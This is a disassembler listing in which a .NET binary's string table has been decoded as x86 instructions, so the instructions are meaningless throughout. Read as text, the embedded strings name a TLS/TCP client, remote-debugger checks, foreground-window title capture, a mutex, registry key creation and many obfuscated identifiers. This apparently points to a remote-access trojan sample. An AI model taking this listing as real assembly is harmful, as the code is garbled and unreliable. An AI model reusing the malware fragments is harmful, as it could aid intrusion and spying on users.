  409a19:	73 6c                	jae    0x409a87
  409a1b:	43                   	inc    %ebx
  409a1c:	6c                   	insb   (%dx),%es:(%edi)
  409a1d:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409a24:	74 5f                	je     0x409a85
  409a26:	53                   	push   %ebx
  409a27:	73 6c                	jae    0x409a95
  409a29:	43                   	inc    %ebx
  409a2a:	6c                   	insb   (%dx),%es:(%edi)
  409a2b:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a32:	74 5f                	je     0x409a93
  409a34:	54                   	push   %esp
  409a35:	63 70 43             	arpl   %esi,0x43(%eax)
  409a38:	6c                   	insb   (%dx),%es:(%edi)
  409a39:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409a40:	74 5f                	je     0x409aa1
  409a42:	54                   	push   %esp
  409a43:	63 70 43             	arpl   %esi,0x43(%eax)
  409a46:	6c                   	insb   (%dx),%es:(%edi)
  409a47:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409a4e:	74 68                	je     0x409ab8
  409a50:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a52:	74 69                	je     0x409abd
  409a54:	63 61 74             	arpl   %esp,0x74(%ecx)
  409a57:	65 41                	gs inc %ecx
  409a59:	73 43                	jae    0x409a9e
  409a5b:	6c                   	insb   (%dx),%es:(%edi)
  409a5c:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  409a63:	73 74                	jae    0x409ad9
  409a65:	65 6d                	gs insl (%dx),%es:(%edi)
  409a67:	2e 4d                	cs dec %ebp
  409a69:	61                   	popa
  409a6a:	6e                   	outsb  %ds:(%esi),(%dx)
  409a6b:	61                   	popa
  409a6c:	67 65 6d             	gs insl (%dx),%es:(%di)
  409a6f:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a71:	74 00                	je     0x409a73
  409a73:	45                   	inc    %ebp
  409a74:	6e                   	outsb  %ds:(%esi),(%dx)
  409a75:	76 69                	jbe    0x409ae0
  409a77:	72 6f                	jb     0x409ae8
  409a79:	6e                   	outsb  %ds:(%esi),(%dx)
  409a7a:	6d                   	insl   (%dx),%es:(%edi)
  409a7b:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a7d:	74 00                	je     0x409a7f
  409a7f:	53                   	push   %ebx
  409a80:	79 73                	jns    0x409af5
  409a82:	74 65                	je     0x409ae9
  409a84:	6d                   	insl   (%dx),%es:(%edi)
  409a85:	2e 43                	cs inc %ebx
  409a87:	6f                   	outsl  %ds:(%esi),(%dx)
  409a88:	6c                   	insb   (%dx),%es:(%edi)
  409a89:	6c                   	insb   (%dx),%es:(%edi)
  409a8a:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409a8f:	6e                   	outsb  %ds:(%esi),(%dx)
  409a90:	73 2e                	jae    0x409ac0
  409a92:	49                   	dec    %ecx
  409a93:	45                   	inc    %ebp
  409a94:	6e                   	outsb  %ds:(%esi),(%dx)
  409a95:	75 6d                	jne    0x409b04
  409a97:	65 72 61             	gs jb  0x409afb
  409a9a:	74 6f                	je     0x409b0b
  409a9c:	72 2e                	jb     0x409acc
  409a9e:	67 65 74 5f          	addr16 gs je 0x409b01
  409aa2:	43                   	inc    %ebx
  409aa3:	75 72                	jne    0x409b17
  409aa5:	72 65                	jb     0x409b0c
  409aa7:	6e                   	outsb  %ds:(%esi),(%dx)
  409aa8:	74 00                	je     0x409aaa
  409aaa:	47                   	inc    %edi
  409aab:	65 74 43             	gs je  0x409af1
  409aae:	75 72                	jne    0x409b22
  409ab0:	72 65                	jb     0x409b17
  409ab2:	6e                   	outsb  %ds:(%esi),(%dx)
  409ab3:	74 00                	je     0x409ab5
  409ab5:	43                   	inc    %ebx
  409ab6:	68 65 63 6b 52       	push   $0x526b6365
  409abb:	65 6d                	gs insl (%dx),%es:(%edi)
  409abd:	6f                   	outsl  %ds:(%esi),(%dx)
  409abe:	74 65                	je     0x409b25
  409ac0:	44                   	inc    %esp
  409ac1:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409ac5:	67 65 72 50          	addr16 gs jb 0x409b19
  409ac9:	72 65                	jb     0x409b30
  409acb:	73 65                	jae    0x409b32
  409acd:	6e                   	outsb  %ds:(%esi),(%dx)
  409ace:	74 00                	je     0x409ad0
  409ad0:	67 65 74 5f          	addr16 gs je 0x409b33
  409ad4:	52                   	push   %edx
  409ad5:	65 6d                	gs insl (%dx),%es:(%edi)
  409ad7:	6f                   	outsl  %ds:(%esi),(%dx)
  409ad8:	74 65                	je     0x409b3f
  409ada:	45                   	inc    %ebp
  409adb:	6e                   	outsb  %ds:(%esi),(%dx)
  409adc:	64 50                	fs push %eax
  409ade:	6f                   	outsl  %ds:(%esi),(%dx)
  409adf:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409ae6:	5f                   	pop    %edi
  409ae7:	43                   	inc    %ebx
  409ae8:	6f                   	outsl  %ds:(%esi),(%dx)
  409ae9:	75 6e                	jne    0x409b59
  409aeb:	74 00                	je     0x409aed
  409aed:	67 65 74 5f          	addr16 gs je 0x409b50
  409af1:	50                   	push   %eax
  409af2:	72 6f                	jb     0x409b63
  409af4:	63 65 73             	arpl   %esp,0x73(%ebp)
  409af7:	73 6f                	jae    0x409b68
  409af9:	72 43                	jb     0x409b3e
  409afb:	6f                   	outsl  %ds:(%esi),(%dx)
  409afc:	75 6e                	jne    0x409b6c
  409afe:	74 00                	je     0x409b00
  409b00:	47                   	inc    %edi
  409b01:	65 74 50             	gs je  0x409b54
  409b04:	61                   	popa
  409b05:	74 68                	je     0x409b6f
  409b07:	52                   	push   %edx
  409b08:	6f                   	outsl  %ds:(%esi),(%dx)
  409b09:	6f                   	outsl  %ds:(%esi),(%dx)
  409b0a:	74 00                	je     0x409b0c
  409b0c:	50                   	push   %eax
  409b0d:	61                   	popa
  409b0e:	72 61                	jb     0x409b71
  409b10:	6d                   	insl   (%dx),%es:(%edi)
  409b11:	65 74 65             	gs je  0x409b79
  409b14:	72 69                	jb     0x409b7f
  409b16:	7a 65                	jp     0x409b7d
  409b18:	64 54                	fs push %esp
  409b1a:	68 72 65 61 64       	push   $0x64616572
  409b1f:	53                   	push   %ebx
  409b20:	74 61                	je     0x409b83
  409b22:	72 74                	jb     0x409b98
  409b24:	00 43 6f             	add    %al,0x6f(%ebx)
  409b27:	6e                   	outsb  %ds:(%esi),(%dx)
  409b28:	76 65                	jbe    0x409b8f
  409b2a:	72 74                	jb     0x409ba0
  409b2c:	00 46 61             	add    %al,0x61(%esi)
  409b2f:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  409b36:	54 
  409b37:	6f                   	outsl  %ds:(%esi),(%dx)
  409b38:	4c                   	dec    %esp
  409b39:	69 73 74 00 6a 75 5a 	imul   $0x5a756a00,0x74(%ebx),%esi
  409b40:	42                   	inc    %edx
  409b41:	43                   	inc    %ebx
  409b42:	50                   	push   %eax
  409b43:	6c                   	insb   (%dx),%es:(%edi)
  409b44:	74 4a                	je     0x409b90
  409b46:	44                   	inc    %esp
  409b47:	74 74                	je     0x409bbd
  409b49:	00 53 79             	add    %dl,0x79(%ebx)
  409b4c:	73 74                	jae    0x409bc2
  409b4e:	65 6d                	gs insl (%dx),%es:(%edi)
  409b50:	2e 43                	cs inc %ebx
  409b52:	6f                   	outsl  %ds:(%esi),(%dx)
  409b53:	6c                   	insb   (%dx),%es:(%edi)
  409b54:	6c                   	insb   (%dx),%es:(%edi)
  409b55:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409b5a:	6e                   	outsb  %ds:(%esi),(%dx)
  409b5b:	73 2e                	jae    0x409b8b
  409b5d:	49                   	dec    %ecx
  409b5e:	45                   	inc    %ebp
  409b5f:	6e                   	outsb  %ds:(%esi),(%dx)
  409b60:	75 6d                	jne    0x409bcf
  409b62:	65 72 61             	gs jb  0x409bc6
  409b65:	74 6f                	je     0x409bd6
  409b67:	72 2e                	jb     0x409b97
  409b69:	4d                   	dec    %ebp
  409b6a:	6f                   	outsl  %ds:(%esi),(%dx)
  409b6b:	76 65                	jbe    0x409bd2
  409b6d:	4e                   	dec    %esi
  409b6e:	65 78 74             	gs js  0x409be5
  409b71:	00 53 79             	add    %dl,0x79(%ebx)
  409b74:	73 74                	jae    0x409bea
  409b76:	65 6d                	gs insl (%dx),%es:(%edi)
  409b78:	2e 54                	cs push %esp
  409b7a:	65 78 74             	gs js  0x409bf1
  409b7d:	00 47 65             	add    %al,0x65(%edi)
  409b80:	74 57                	je     0x409bd9
  409b82:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409b89:	78 74                	js     0x409bff
  409b8b:	00 65 51             	add    %ah,0x51(%ebp)
  409b8e:	53                   	push   %ebx
  409b8f:	61                   	popa
  409b90:	75 63                	jne    0x409bf5
  409b92:	4b                   	dec    %ebx
  409b93:	53                   	push   %ebx
  409b94:	6f                   	outsl  %ds:(%esi),(%dx)
  409b95:	68 56 4f 41 75       	push   $0x75414f56
  409b9a:	00 44 66 48          	add    %al,0x48(%esi,%eiz,2)
  409b9e:	53                   	push   %ebx
  409b9f:	6c                   	insb   (%dx),%es:(%edi)
  409ba0:	56                   	push   %esi
  409ba1:	54                   	push   %esp
  409ba2:	48                   	dec    %eax
  409ba3:	51                   	push   %ecx
  409ba4:	46                   	inc    %esi
  409ba5:	75 00                	jne    0x409ba7
  409ba7:	52                   	push   %edx
  409ba8:	69 70 66 63 59 58 43 	imul   $0x43585963,0x66(%eax),%esi
  409baf:	73 65                	jae    0x409c16
  409bb1:	51                   	push   %ecx
  409bb2:	75 00                	jne    0x409bb4
  409bb4:	6d                   	insl   (%dx),%es:(%edi)
  409bb5:	57                   	push   %edi
  409bb6:	65 7a 4f             	gs jp  0x409c08
  409bb9:	4a                   	dec    %edx
  409bba:	6b 43 67 6b          	imul   $0x6b,0x67(%ebx),%eax
  409bbe:	5a                   	pop    %edx
  409bbf:	57                   	push   %edi
  409bc0:	75 00                	jne    0x409bc2
  409bc2:	69 4d 55 71 62 74 44 	imul   $0x44746271,0x55(%ebp),%ecx
  409bc9:	50                   	push   %eax
  409bca:	43                   	inc    %ebx
  409bcb:	51                   	push   %ecx
  409bcc:	56                   	push   %esi
  409bcd:	65 75 00             	gs jne 0x409bd0
  409bd0:	4f                   	dec    %edi
  409bd1:	46                   	inc    %esi
  409bd2:	64 42                	fs inc %edx
  409bd4:	76 73                	jbe    0x409c49
  409bd6:	45                   	inc    %ebp
  409bd7:	4b                   	dec    %ebx
  409bd8:	6e                   	outsb  %ds:(%esi),(%dx)
  409bd9:	6d                   	insl   (%dx),%es:(%edi)
  409bda:	57                   	push   %edi
  409bdb:	58                   	pop    %eax
  409bdc:	71 65                	jno    0x409c43
  409bde:	6c                   	insb   (%dx),%es:(%edi)
  409bdf:	69 75 00 4a 6a 52 53 	imul   $0x53526a4a,0x0(%ebp),%esi
  409be6:	4d                   	dec    %ebp
  409be7:	45                   	inc    %ebp
  409be8:	6b 70 76 49          	imul   $0x49,0x76(%eax),%esi
  409bec:	4b                   	dec    %ebx
  409bed:	76 71                	jbe    0x409c60
  409bef:	6a 75                	push   $0x75
  409bf1:	00 52 4f             	add    %dl,0x4f(%edx)
  409bf4:	48                   	dec    %eax
  409bf5:	62 6e 7a             	bound  %ebp,0x7a(%esi)
  409bf8:	78 56                	js     0x409c50
  409bfa:	4f                   	dec    %edi
  409bfb:	79 6a                	jns    0x409c67
  409bfd:	75 00                	jne    0x409bff
  409bff:	68 78 6e 4d 41       	push   $0x414d6e78
  409c04:	4c                   	dec    %esp
  409c05:	4a                   	dec    %edx
  409c06:	75 4a                	jne    0x409c52
  409c08:	54                   	push   %esp
  409c09:	78 75                	js     0x409c80
  409c0b:	00 65 7a             	add    %ah,0x7a(%ebp)
  409c0e:	50                   	push   %eax
  409c0f:	77 52                	ja     0x409c63
  409c11:	45                   	inc    %ebp
  409c12:	62 44 55 4e          	bound  %eax,0x4e(%ebp,%edx,2)
  409c16:	72 59                	jb     0x409c71
  409c18:	4d                   	dec    %ebp
  409c19:	41                   	inc    %ecx
  409c1a:	76 00                	jbe    0x409c1c
  409c1c:	54                   	push   %esp
  409c1d:	79 56                	jns    0x409c75
  409c1f:	6f                   	outsl  %ds:(%esi),(%dx)
  409c20:	72 75                	jb     0x409c97
  409c22:	75 4c                	jne    0x409c70
  409c24:	75 6c                	jne    0x409c92
  409c26:	43                   	inc    %ebx
  409c27:	76 00                	jbe    0x409c29
  409c29:	64 53                	fs push %ebx
  409c2b:	79 6b                	jns    0x409c98
  409c2d:	41                   	inc    %ecx
  409c2e:	50                   	push   %eax
  409c2f:	59                   	pop    %ecx
  409c30:	66 68 5a 78          	pushw  $0x785a
  409c34:	6e                   	outsb  %ds:(%esi),(%dx)
  409c35:	78 79                	js     0x409cb0
  409c37:	43                   	inc    %ebx
  409c38:	76 00                	jbe    0x409c3a
  409c3a:	4b                   	dec    %ebx
  409c3b:	56                   	push   %esi
  409c3c:	79 76                	jns    0x409cb4
  409c3e:	53                   	push   %ebx
  409c3f:	71 74                	jno    0x409cb5
  409c41:	45                   	inc    %ebp
  409c42:	6c                   	insb   (%dx),%es:(%edi)
  409c43:	6a 73                	push   $0x73
  409c45:	47                   	inc    %edi
  409c46:	76 00                	jbe    0x409c48
  409c48:	76 65                	jbe    0x409caf
  409c4a:	65 71 72             	gs jno 0x409cbf
  409c4d:	73 61                	jae    0x409cb0
  409c4f:	6a 7a                	push   $0x7a
  409c51:	68 50 51 52 76       	push   $0x76525150
  409c56:	00 51 63             	add    %dl,0x63(%ecx)
  409c59:	45                   	inc    %ebp
  409c5a:	41                   	inc    %ecx
  409c5b:	54                   	push   %esp
  409c5c:	66 6d                	insw   (%dx),%es:(%edi)
  409c5e:	76 62                	jbe    0x409cc2
  409c60:	6a 55                	push   $0x55
  409c62:	76 00                	jbe    0x409c64
  409c64:	63 73 46             	arpl   %esi,0x46(%ebx)
  409c67:	52                   	push   %edx
  409c68:	50                   	push   %eax
  409c69:	59                   	pop    %ecx
  409c6a:	6f                   	outsl  %ds:(%esi),(%dx)
  409c6b:	48                   	dec    %eax
  409c6c:	44                   	inc    %esp
  409c6d:	6c                   	insb   (%dx),%es:(%edi)
  409c6e:	42                   	inc    %edx
  409c6f:	44                   	inc    %esp
  409c70:	56                   	push   %esi
  409c71:	76 00                	jbe    0x409c73
  409c73:	71 4e                	jno    0x409cc3
  409c75:	4d                   	dec    %ebp
  409c76:	53                   	push   %ebx
  409c77:	75 4b                	jne    0x409cc4
  409c79:	6e                   	outsb  %ds:(%esi),(%dx)
  409c7a:	5a                   	pop    %edx
  409c7b:	5a                   	pop    %edx
  409c7c:	76 00                	jbe    0x409c7e
  409c7e:	49                   	dec    %ecx
  409c7f:	7a 73                	jp     0x409cf4
  409c81:	50                   	push   %eax
  409c82:	55                   	push   %ebp
  409c83:	65 55                	gs push %ebp
  409c85:	7a 48                	jp     0x409ccf
  409c87:	67 62 76 00          	bound  %esi,0x0(%bp)
  409c8b:	76 66                	jbe    0x409cf3
  409c8d:	61                   	popa
  409c8e:	68 77 64 6f 51       	push   $0x516f6477
  409c93:	58                   	pop    %eax
  409c94:	54                   	push   %esp
  409c95:	66 59                	pop    %cx
  409c97:	78 76                	js     0x409d0f
  409c99:	00 64 66 64          	add    %ah,0x64(%esi,%eiz,2)
  409c9d:	56                   	push   %esi
  409c9e:	46                   	inc    %esi
  409c9f:	59                   	pop    %ecx
  409ca0:	66 57                	push   %di
  409ca2:	4d                   	dec    %ebp
  409ca3:	53                   	push   %ebx
  409ca4:	6a 6a                	push   $0x6a
  409ca6:	73 42                	jae    0x409cea
  409ca8:	77 00                	ja     0x409caa
  409caa:	61                   	popa
  409cab:	42                   	inc    %edx
  409cac:	6c                   	insb   (%dx),%es:(%edi)
  409cad:	6f                   	outsl  %ds:(%esi),(%dx)
  409cae:	72 68                	jb     0x409d18
  409cb0:	43                   	inc    %ebx
  409cb1:	75 56                	jne    0x409d09
  409cb3:	4a                   	dec    %edx
  409cb4:	47                   	inc    %edi
  409cb5:	77 00                	ja     0x409cb7
  409cb7:	6d                   	insl   (%dx),%es:(%edi)
  409cb8:	6f                   	outsl  %ds:(%esi),(%dx)
  409cb9:	63 4d 6d             	arpl   %ecx,0x6d(%ebp)
  409cbc:	4d                   	dec    %ebp
  409cbd:	42                   	inc    %edx
  409cbe:	72 53                	jb     0x409d13
  409cc0:	48                   	dec    %eax
  409cc1:	77 00                	ja     0x409cc3
  409cc3:	55                   	push   %ebp
  409cc4:	77 76                	ja     0x409d3c
  409cc6:	54                   	push   %esp
  409cc7:	76 56                	jbe    0x409d1f
  409cc9:	4c                   	dec    %esp
  409cca:	53                   	push   %ebx
  409ccb:	53                   	push   %ebx
  409ccc:	4b                   	dec    %ebx
  409ccd:	4d                   	dec    %ebp
  409cce:	77 00                	ja     0x409cd0
  409cd0:	66 67 41             	addr16 inc %cx
  409cd3:	65 78 5a             	gs js  0x409d30
  409cd6:	61                   	popa
  409cd7:	66 44                	inc    %sp
  409cd9:	53                   	push   %ebx
  409cda:	6c                   	insb   (%dx),%es:(%edi)
  409cdb:	4a                   	dec    %edx
  409cdc:	72 50                	jb     0x409d2e
  409cde:	74 4f                	je     0x409d2f
  409ce0:	77 00                	ja     0x409ce2
  409ce2:	6d                   	insl   (%dx),%es:(%edi)
  409ce3:	59                   	pop    %ecx
  409ce4:	64 52                	fs push %edx
  409ce6:	68 56 6a 45 52       	push   $0x52456a56
  409ceb:	77 00                	ja     0x409ced
  409ced:	49                   	dec    %ecx
  409cee:	5a                   	pop    %edx
  409cef:	76 69                	jbe    0x409d5a
  409cf1:	67 42                	addr16 inc %edx
  409cf3:	4e                   	dec    %esi
  409cf4:	75 6f                	jne    0x409d65
  409cf6:	44                   	inc    %esp
  409cf7:	76 55                	jbe    0x409d4e
  409cf9:	77 00                	ja     0x409cfb
  409cfb:	6d                   	insl   (%dx),%es:(%edi)
  409cfc:	53                   	push   %ebx
  409cfd:	41                   	inc    %ecx
  409cfe:	4e                   	dec    %esi
  409cff:	64 69 73 77 53 63 64 	imul   $0x6d646353,%fs:0x77(%ebx),%esi
  409d06:	6d 
  409d07:	77 00                	ja     0x409d09
  409d09:	47                   	inc    %edi
  409d0a:	65 74 46             	gs je  0x409d53
  409d0d:	6f                   	outsl  %ds:(%esi),(%dx)
  409d0e:	72 65                	jb     0x409d75
  409d10:	67 72 6f             	addr16 jb 0x409d82
  409d13:	75 6e                	jne    0x409d83
  409d15:	64 57                	fs push %edi
  409d17:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  409d1e:	65 74 5f             	gs je  0x409d80
  409d21:	43                   	inc    %ebx
  409d22:	72 65                	jb     0x409d89
  409d24:	61                   	popa
  409d25:	74 65                	je     0x409d8c
  409d27:	4e                   	dec    %esi
  409d28:	6f                   	outsl  %ds:(%esi),(%dx)
  409d29:	57                   	push   %edi
  409d2a:	69 6e 64 6f 77 00 42 	imul   $0x4200776f,0x64(%esi),%ebp
  409d31:	63 42 41             	arpl   %eax,0x41(%edx)
  409d34:	79 6b                	jns    0x409da1
  409d36:	41                   	inc    %ecx
  409d37:	64 6b 6d 41 47       	imul   $0x47,%fs:0x41(%ebp),%ebp
  409d3c:	48                   	dec    %eax
  409d3d:	4d                   	dec    %ebp
  409d3e:	78 00                	js     0x409d40
  409d40:	55                   	push   %ebp
  409d41:	46                   	inc    %esi
  409d42:	77 4a                	ja     0x409d8e
  409d44:	79 5a                	jns    0x409da0
  409d46:	68 78 55 78 00       	push   $0x785578
  409d4b:	6c                   	insb   (%dx),%es:(%edi)
  409d4c:	44                   	inc    %esp
  409d4d:	52                   	push   %edx
  409d4e:	66 6f                	outsw  %ds:(%esi),(%dx)
  409d50:	56                   	push   %esi
  409d51:	52                   	push   %edx
  409d52:	50                   	push   %eax
  409d53:	5a                   	pop    %edx
  409d54:	78 00                	js     0x409d56
  409d56:	47                   	inc    %edi
  409d57:	48                   	dec    %eax
  409d58:	4d                   	dec    %ebp
  409d59:	6d                   	insl   (%dx),%es:(%edi)
  409d5a:	6f                   	outsl  %ds:(%esi),(%dx)
  409d5b:	69 48 58 49 6a 5a 63 	imul   $0x635a6a49,0x58(%eax),%ecx
  409d62:	78 00                	js     0x409d64
  409d64:	53                   	push   %ebx
  409d65:	61                   	popa
  409d66:	79 47                	jns    0x409daf
  409d68:	65 78 00             	gs js  0x409d6b
  409d6b:	4d                   	dec    %ebp
  409d6c:	75 74                	jne    0x409de2
  409d6e:	65 78 00             	gs js  0x409d71
  409d71:	55                   	push   %ebp
  409d72:	44                   	inc    %esp
  409d73:	7a 4e                	jp     0x409dc3
  409d75:	66 41                	inc    %cx
  409d77:	6f                   	outsl  %ds:(%esi),(%dx)
  409d78:	76 44                	jbe    0x409dbe
  409d7a:	72 7a                	jb     0x409df6
  409d7c:	6a 74                	push   $0x74
  409d7e:	78 00                	js     0x409d80
  409d80:	7a 70                	jp     0x409df2
  409d82:	56                   	push   %esi
  409d83:	4f                   	dec    %edi
  409d84:	6c                   	insb   (%dx),%es:(%edi)
  409d85:	66 59                	pop    %cx
  409d87:	53                   	push   %ebx
  409d88:	58                   	pop    %eax
  409d89:	54                   	push   %esp
  409d8a:	5a                   	pop    %edx
  409d8b:	67 4c                	addr16 dec %esp
  409d8d:	77 78                	ja     0x409e07
  409d8f:	00 51 76             	add    %dl,0x76(%ecx)
  409d92:	77 49                	ja     0x409ddd
  409d94:	67 5a                	addr16 pop %edx
  409d96:	68 4b 6b 75 5a       	push   $0x5a756b4b
  409d9b:	41                   	inc    %ecx
  409d9c:	7a 78                	jp     0x409e16
  409d9e:	00 5a 42             	add    %bl,0x42(%edx)
  409da1:	7a 70                	jp     0x409e13
  409da3:	43                   	inc    %ebx
  409da4:	54                   	push   %esp
  409da5:	4a                   	dec    %edx
  409da6:	79 76                	jns    0x409e1e
  409da8:	5a                   	pop    %edx
  409da9:	51                   	push   %ecx
  409daa:	7a 75                	jp     0x409e21
  409dac:	45                   	inc    %ebp
  409dad:	79 00                	jns    0x409daf
  409daf:	7a 45                	jp     0x409df6
  409db1:	79 49                	jns    0x409dfc
  409db3:	44                   	inc    %esp
  409db4:	4d                   	dec    %ebp
  409db5:	7a 5a                	jp     0x409e11
  409db7:	59                   	pop    %ecx
  409db8:	7a 55                	jp     0x409e0f
  409dba:	4e                   	dec    %esi
  409dbb:	52                   	push   %edx
  409dbc:	79 00                	jns    0x409dbe
  409dbe:	4d                   	dec    %ebp
  409dbf:	48                   	dec    %eax
  409dc0:	72 44                	jb     0x409e06
  409dc2:	55                   	push   %ebp
  409dc3:	49                   	dec    %ecx
  409dc4:	71 57                	jno    0x409e1d
  409dc6:	73 74                	jae    0x409e3c
  409dc8:	4f                   	dec    %edi
  409dc9:	6b 58 79 00          	imul   $0x0,0x79(%eax),%ebx
  409dcd:	49                   	dec    %ecx
  409dce:	6e                   	outsb  %ds:(%esi),(%dx)
  409dcf:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409dd6:	65 
  409dd7:	41                   	inc    %ecx
  409dd8:	72 72                	jb     0x409e4c
  409dda:	61                   	popa
  409ddb:	79 00                	jns    0x409ddd
  409ddd:	54                   	push   %esp
  409dde:	6f                   	outsl  %ds:(%esi),(%dx)
  409ddf:	41                   	inc    %ecx
  409de0:	72 72                	jb     0x409e54
  409de2:	61                   	popa
  409de3:	79 00                	jns    0x409de5
  409de5:	67 65 74 5f          	addr16 gs je 0x409e48
  409de9:	41                   	inc    %ecx
  409dea:	73 41                	jae    0x409e2d
  409dec:	72 72                	jb     0x409e60
  409dee:	61                   	popa
  409def:	79 00                	jns    0x409df1
  409df1:	67 65 74 5f          	addr16 gs je 0x409e54
  409df5:	4b                   	dec    %ebx
  409df6:	65 79 00             	gs jns 0x409df9
  409df9:	73 65                	jae    0x409e60
  409dfb:	74 5f                	je     0x409e5c
  409dfd:	4b                   	dec    %ebx
  409dfe:	65 79 00             	gs jns 0x409e01
  409e01:	43                   	inc    %ebx
  409e02:	72 65                	jb     0x409e69
  409e04:	61                   	popa
  409e05:	74 65                	je     0x409e6c
  409e07:	53                   	push   %ebx
  409e08:	75 62                	jne    0x409e6c
  409e0a:	4b                   	dec    %ebx
  409e0b:	65 79 00             	gs jns 0x409e0e
  409e0e:	4f                   	dec    %edi
  409e0f:	70 65                	jo     0x409e76
  409e11:	6e                   	outsb  %ds:(%esi),(%dx)
  409e12:	53                   	push   %ebx
  409e13:	75 62                	jne    0x409e77
  409e15:	4b                   	dec    %ebx
  409e16:	65 79 00             	gs jns 0x409e19
  409e19:	67 65 74 5f          	addr16 gs je 0x409e7c
  409e1d:	50                   	push   %eax
  409e1e:	75 62                	jne    0x409e82
  409e20:	6c                   	insb   (%dx),%es:(%edi)
  409e21:	69 63 4b 65 79 00 52 	imul   $0x52007965,0x4b(%ebx),%esp
  409e28:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409e2f:	4b 65 
  409e31:	79 00                	jns    0x409e33
  409e33:	53                   	push   %ebx
  409e34:	79 73                	jns    0x409ea9
  409e36:	74 65                	je     0x409e9d
  409e38:	6d                   	insl   (%dx),%es:(%edi)
  409e39:	2e 53                	cs push %ebx
  409e3b:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409e3f:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409e46:	70 
  409e47:	74 6f                	je     0x409eb8
  409e49:	67 72 61             	addr16 jb 0x409ead
  409e4c:	70 68                	jo     0x409eb6
  409e4e:	79 00                	jns    0x409e50
  409e50:	41                   	inc    %ecx
  409e51:	73 73                	jae    0x409ec6
  409e53:	65 6d                	gs insl (%dx),%es:(%edi)
  409e55:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409e59:	41                   	inc    %ecx
  409e5a:	64 64 72 65          	fs fs jb 0x409ec3
  409e5e:	73 73                	jae    0x409ed3
  409e60:	46                   	inc    %esi
  409e61:	61                   	popa
  409e62:	6d                   	insl   (%dx),%es:(%edi)
  409e63:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409e6a:	63 
  409e6b:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409e6f:	79 00                	jns    0x409e71
  409e71:	54                   	push   %esp
  409e72:	6f                   	outsl  %ds:(%esi),(%dx)
  409e73:	42                   	inc    %edx
  409e74:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409e7b:	65 74 5f             	gs je  0x409edd
  409e7e:	53                   	push   %ebx
  409e7f:	79 73                	jns    0x409ef4
  409e81:	74 65                	je     0x409ee8
  409e83:	6d                   	insl   (%dx),%es:(%edi)
  409e84:	44                   	inc    %esp
  409e85:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409e8c:	79 00                	jns    0x409e8e
  409e8e:	52                   	push   %edx
  409e8f:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  409e96:	00 6f 
  409e98:	70 5f                	jo     0x409ef9
  409e9a:	45                   	inc    %ebp
  409e9b:	71 75                	jno    0x409f12
  409e9d:	61                   	popa
  409e9e:	6c                   	insb   (%dx),%es:(%edi)
  409e9f:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  409ea6:	49 
  409ea7:	6e                   	outsb  %ds:(%esi),(%dx)
  409ea8:	65 71 75             	gs jno 0x409f20
  409eab:	61                   	popa
  409eac:	6c                   	insb   (%dx),%es:(%edi)
  409ead:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  409eb4:	74 
  409eb5:	65 6d                	gs insl (%dx),%es:(%edi)
  409eb7:	2e 4e                	cs dec %esi
  409eb9:	65 74 2e             	gs je  0x409eea
  409ebc:	53                   	push   %ebx
  409ebd:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409ec1:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  409ec8:	64 
  409ec9:	6f                   	outsl  %ds:(%esi),(%dx)
  409eca:	77 73                	ja     0x409f3f
  409ecc:	49                   	dec    %ecx
  409ecd:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409ed0:	74 69                	je     0x409f3b
  409ed2:	74 79                	je     0x409f4d
  409ed4:	00 49 73             	add    %cl,0x73(%ecx)
  409ed7:	4e                   	dec    %esi
  409ed8:	75 6c                	jne    0x409f46
  409eda:	6c                   	insb   (%dx),%es:(%edi)
  409edb:	4f                   	dec    %edi
  409edc:	72 45                	jb     0x409f23
  409ede:	6d                   	insl   (%dx),%es:(%edi)
  409edf:	70 74                	jo     0x409f55
  409ee1:	79 00                	jns    0x409ee3
  409ee3:	6d                   	insl   (%dx),%es:(%edi)
  409ee4:	63 79 41             	arpl   %edi,0x41(%ecx)
  409ee7:	62 75 53             	bound  %esi,0x53(%ebp)
  409eea:	6b 42 76 79          	imul   $0x79,0x76(%edx),%eax
  409eee:	00 45 78             	add    %al,0x78(%ebp)
  409ef1:	4f                   	dec    %edi
  409ef2:	4a                   	dec    %edx
  409ef3:	6c                   	insb   (%dx),%es:(%edi)
  409ef4:	78 75                	js     0x409f6b
  409ef6:	43                   	inc    %ebx
  409ef7:	62 6e 44             	bound  %ebp,0x44(%esi)
  409efa:	77 79                	ja     0x409f75
